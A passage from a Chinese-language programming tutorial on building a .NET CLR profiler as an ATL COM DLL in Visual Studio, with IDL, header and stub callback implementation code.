src=\"RegisterOutput.png\"></p>\n<p>在<code>Properties/Linker/Input/Additonal Dependencies</code>添加依赖库<code>corguids.lib</code></p>\n<p><img src=\"AdditonalDependencies.png\"></p>\n<h2 id=\"添加代码\"><a href=\"#添加代码\" class=\"headerlink\" title=\"添加代码\"></a>添加代码</h2><ul>\n<li><strong>framework.h:</strong> 在文件尾添加<code>using namespace ATL;</code></li>\n<li><strong>Resource.h:</strong> 添加<code>#define IDR_PROFILER    102</code></li>\n<li><strong>CLRProfiler.cpp:</strong> 删除函数<code>STDAPI DllInstall(BOOL bInstall, _In_opt_  LPCWSTR pszCmdLine)</code></li>\n<li><strong>CLRProfiler.def:</strong> 将<code>LIBRARY</code>替换成<code>LIBRARY &quot;CLRProfiler.dll&quot;</code>，删除<code>DllInstall PRIVATE</code></li>\n<li><strong>CLRProfiler.idl:</strong> 替换idl文件代码：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import &quot;oaidl.idl&quot;;</span><br><span class=\"line\">import &quot;ocidl.idl&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">[</span><br><span class=\"line\">    object,</span><br><span class=\"line\">    uuid(22ADD80B-C4E6-42FE-BC33-1921A2B5F662),</span><br><span class=\"line\">    helpstring(&quot;ICLRProfiler Interface&quot;),</span><br><span class=\"line\">    pointer_default(unique)</span><br><span class=\"line\">]</span><br><span class=\"line\">interface ICLRProfiler : IUnknown &#123;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">[</span><br><span class=\"line\">    uuid(48C2393F-5542-4DC6-BEE9-49CDF10F91DA),</span><br><span class=\"line\">    version(1.0),</span><br><span class=\"line\">    helpstring(&quot;Profiler 1.0 Type Library&quot;)</span><br><span class=\"line\">]</span><br><span class=\"line\">library CLRProfilerLib</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    importlib(&quot;stdole2.tlb&quot;);</span><br><span class=\"line\">    [</span><br><span class=\"line\">        uuid(F62D32FD-6D99-4C9F-B891-A5FCEB01B1CD),</span><br><span class=\"line\">        helpstring(&quot;CLRProfiler Class&quot;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    coclass CLRProfiler</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        [default] interface IUnknown;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>ProfilerCallback.h:</strong> 创建探测器回调函数的头文件：</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">pragma</span> once</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;cor.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;corprof.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;framework.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;CLRProfiler_i.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ATL_NO_VTABLE</span> <span class=\"title\">ProfilerCallback</span> :</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> CComObjectRootEx&lt;CComSingleThreadModel&gt;,</span><br><span class=\"line\">    <span class=\"keyword\">public</span> CComCoClass&lt;ProfilerCallback, &amp;CLSID_CLRProfiler&gt;,</span><br><span class=\"line\">    <span class=\"keyword\">public</span> ICorProfilerCallback2</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">ProfilerCallback</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">DECLARE_REGISTRY_RESOURCEID</span>(IDR_PROFILER)</span><br><span class=\"line\">    <span class=\"built_in\">BEGIN_COM_MAP</span>(ProfilerCallback)</span><br><span class=\"line\">        <span class=\"built_in\">COM_INTERFACE_ENTRY</span>(ICorProfilerCallback)</span><br><span class=\"line\">        <span class=\"built_in\">COM_INTERFACE_ENTRY</span>(ICorProfilerCallback2)</span><br><span class=\"line\">    <span class=\"built_in\">END_COM_MAP</span>()</span><br><span class=\"line\">    <span class=\"built_in\">DECLARE_PROTECT_FINAL_CONSTRUCT</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">HRESULT <span class=\"title\">FinalConstruct</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">FinalRelease</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ICorProfilerCallback interface implementation</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">Initialize</span><span class=\"params\">(IUnknown* pICorProfilerInfoUnk)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">Shutdown</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AppDomainCreationStarted</span><span class=\"params\">(AppDomainID appDomainID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AppDomainCreationFinished</span><span class=\"params\">(AppDomainID appDomainID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AppDomainShutdownStarted</span><span class=\"params\">(AppDomainID appDomainID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AppDomainShutdownFinished</span><span class=\"params\">(AppDomainID appDomainID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AssemblyLoadStarted</span><span class=\"params\">(AssemblyID assemblyID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AssemblyLoadFinished</span><span class=\"params\">(AssemblyID assemblyID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AssemblyUnloadStarted</span><span class=\"params\">(AssemblyID assemblyID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">AssemblyUnloadFinished</span><span class=\"params\">(AssemblyID assemblyID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ModuleLoadStarted</span><span class=\"params\">(ModuleID moduleID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ModuleLoadFinished</span><span class=\"params\">(ModuleID moduleID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ModuleUnloadStarted</span><span class=\"params\">(ModuleID moduleID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ModuleUnloadFinished</span><span class=\"params\">(ModuleID moduleID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ModuleAttachedToAssembly</span><span class=\"params\">(ModuleID moduleID, AssemblyID assemblyID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ClassLoadStarted</span><span class=\"params\">(ClassID classID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ClassLoadFinished</span><span class=\"params\">(ClassID classID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ClassUnloadStarted</span><span class=\"params\">(ClassID classID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ClassUnloadFinished</span><span class=\"params\">(ClassID classID, HRESULT hrStatus)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">FunctionUnloadStarted</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">JITCompilationStarted</span><span class=\"params\">(FunctionID functionID, BOOL fIsSafeToBlock)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">JITCompilationFinished</span><span class=\"params\">(FunctionID functionID, HRESULT hrStatus, BOOL fIsSafeToBlock)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">JITCachedFunctionSearchStarted</span><span class=\"params\">(FunctionID functionID, BOOL* pbUseCachedFunction)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">JITCachedFunctionSearchFinished</span><span class=\"params\">(FunctionID functionID, COR_PRF_JIT_CACHE result)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">JITFunctionPitched</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">JITInlining</span><span class=\"params\">(FunctionID callerID, FunctionID calleeID, BOOL* pfShouldInline)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ThreadCreated</span><span class=\"params\">(ThreadID threadID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ThreadDestroyed</span><span class=\"params\">(ThreadID threadID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ThreadAssignedToOSThread</span><span class=\"params\">(ThreadID managedThreadID, DWORD osThreadID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingClientInvocationStarted</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingClientSendingMessage</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingClientReceivingReply</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingClientInvocationFinished</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingServerReceivingMessage</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingServerInvocationStarted</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingServerInvocationReturned</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RemotingServerSendingReply</span><span class=\"params\">(GUID* pCookie, BOOL fIsAsync)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">UnmanagedToManagedTransition</span><span class=\"params\">(FunctionID functionID, COR_PRF_TRANSITION_REASON reason)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ManagedToUnmanagedTransition</span><span class=\"params\">(FunctionID functionID, COR_PRF_TRANSITION_REASON reason)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeSuspendStarted</span><span class=\"params\">(COR_PRF_SUSPEND_REASON suspendReason)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeSuspendFinished</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeSuspendAborted</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeResumeStarted</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeResumeFinished</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeThreadSuspended</span><span class=\"params\">(ThreadID threadid)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RuntimeThreadResumed</span><span class=\"params\">(ThreadID threadid)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">MovedReferences</span><span class=\"params\">(ULONG cmovedObjectIDRanges, ObjectID oldObjectIDRangeStart[], ObjectID newObjectIDRangeStart[], ULONG cObjectIDRangeLength[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ObjectAllocated</span><span class=\"params\">(ObjectID objectID, ClassID classID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ObjectsAllocatedByClass</span><span class=\"params\">(ULONG classCount, ClassID classIDs[], ULONG objects[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ObjectReferences</span><span class=\"params\">(ObjectID objectID, ClassID classID, ULONG cObjectRefs, ObjectID objectRefIDs[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RootReferences</span><span class=\"params\">(ULONG cRootRefs, ObjectID rootRefIDs[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionThrown</span><span class=\"params\">(ObjectID thrownObjectID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionSearchFunctionEnter</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionSearchFunctionLeave</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionSearchFilterEnter</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionSearchFilterLeave</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionSearchCatcherFound</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionCLRCatcherFound</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionCLRCatcherExecute</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionOSHandlerEnter</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionOSHandlerLeave</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionUnwindFunctionEnter</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionUnwindFunctionLeave</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionUnwindFinallyEnter</span><span class=\"params\">(FunctionID functionID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionUnwindFinallyLeave</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionCatcherEnter</span><span class=\"params\">(FunctionID functionID, ObjectID objectID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ExceptionCatcherLeave</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">COMClassicVTableCreated</span><span class=\"params\">(ClassID wrappedClassID, REFGUID implementedIID, <span class=\"keyword\">void</span>* pVTable, ULONG cSlots)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">COMClassicVTableDestroyed</span><span class=\"params\">(ClassID wrappedClassID, REFGUID implementedIID, <span class=\"keyword\">void</span>* pVTable)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ICorProfilerCallback2 interface implementation</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">ThreadNameChanged</span><span class=\"params\">(ThreadID threadId, ULONG cchName, WCHAR name[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">GarbageCollectionStarted</span><span class=\"params\">(<span class=\"keyword\">int</span> cGenerations, BOOL generationCollected[], COR_PRF_GC_REASON reason)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">SurvivingReferences</span><span class=\"params\">(ULONG cSurvivingObjectIDRanges, ObjectID objectIDRangeStart[], ULONG cObjectIDRangeLength[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">GarbageCollectionFinished</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">FinalizeableObjectQueued</span><span class=\"params\">(DWORD finalizerFlags, ObjectID objectID)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">RootReferences2</span><span class=\"params\">(ULONG cRootRefs, ObjectID rootRefIds[], COR_PRF_GC_ROOT_KIND rootKinds[], COR_PRF_GC_ROOT_FLAGS rootFlags[], UINT_PTR rootIds[])</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">HandleCreated</span><span class=\"params\">(GCHandleID handleId, ObjectID initialObjectId)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> HRESULT __stdcall <span class=\"title\">HandleDestroyed</span><span class=\"params\">(GCHandleID handleId)</span></span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">OBJECT_ENTRY_AUTO</span>(__uuidof(CLRProfiler), ProfilerCallback)</span><br></pre></td></tr></table></figure>\n\n<p>Visual Studio虽然会报错误找不到<code>CLSID_CLRProfiler</code>，这时只需要编译项目就会生成<code>CLRProfiler_i.c</code>和<code>CLRProfiler_i.h</code>两个文件，缺少的定义会在这两个文件中被定义。</p>\n<ul>\n<li><strong>ProfilerCallback.cpp:</strong> 创建探测器回调函数的实现代码：</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;pch.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;ProfilerCallback.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">ProfilerCallback::<span class=\"built_in\">ProfilerCallback</span>() &#123;</span><br><span class=\"line\">\tstd::cout &lt;&lt; <span class=\"string\">&quot;ProfilerCallback::ProfilerCallback()&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT <span class=\"title\">ProfilerCallback::FinalConstruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ProfilerCallback::FinalRelease</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::Initialize</span><span class=\"params\">(IUnknown* pICorProfilerInfoUnk)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tstd::cout &lt;&lt; <span class=\"string\">&quot;ProfilerCallback::Initialize(IUnknown* pICorProfilerInfoUnk)&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::Shutdown</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AppDomainCreationStarted</span><span class=\"params\">(AppDomainID appDomainID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AppDomainCreationFinished</span><span class=\"params\">(AppDomainID appDomainID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AppDomainShutdownStarted</span><span class=\"params\">(AppDomainID appDomainID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AppDomainShutdownFinished</span><span class=\"params\">(AppDomainID appDomainID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AssemblyLoadStarted</span><span class=\"params\">(AssemblyID assemblyID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AssemblyLoadFinished</span><span class=\"params\">(AssemblyID assemblyID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AssemblyUnloadStarted</span><span class=\"params\">(AssemblyID assemblyID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::AssemblyUnloadFinished</span><span class=\"params\">(AssemblyID assemblyID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ModuleLoadStarted</span><span class=\"params\">(ModuleID moduleID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ModuleLoadFinished</span><span class=\"params\">(ModuleID moduleID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ModuleUnloadStarted</span><span class=\"params\">(ModuleID moduleID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ModuleUnloadFinished</span><span class=\"params\">(ModuleID moduleID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ModuleAttachedToAssembly</span><span class=\"params\">(ModuleID moduleID, AssemblyID assemblyID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ClassLoadStarted</span><span class=\"params\">(ClassID classID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ClassLoadFinished</span><span class=\"params\">(ClassID classID, HRESULT hrStatus)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> S_OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">HRESULT __stdcall <span class=\"title\">ProfilerCallback::ClassUnloadStarted</span><span 